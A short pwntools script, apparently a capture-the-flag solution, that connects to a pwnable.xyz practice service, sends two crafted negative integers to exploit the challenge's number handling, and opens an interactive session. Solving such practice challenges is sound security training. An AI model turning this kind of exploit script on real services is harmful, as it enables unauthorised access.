from pwn import *

#sh = process("./challenge")
sh = remote("svc.pwnable.xyz", 30001)

sh.recv()
sh.send(str(int(-0x1337)) + " " + str(int(-(0x1337*2))))
sh.interactive()
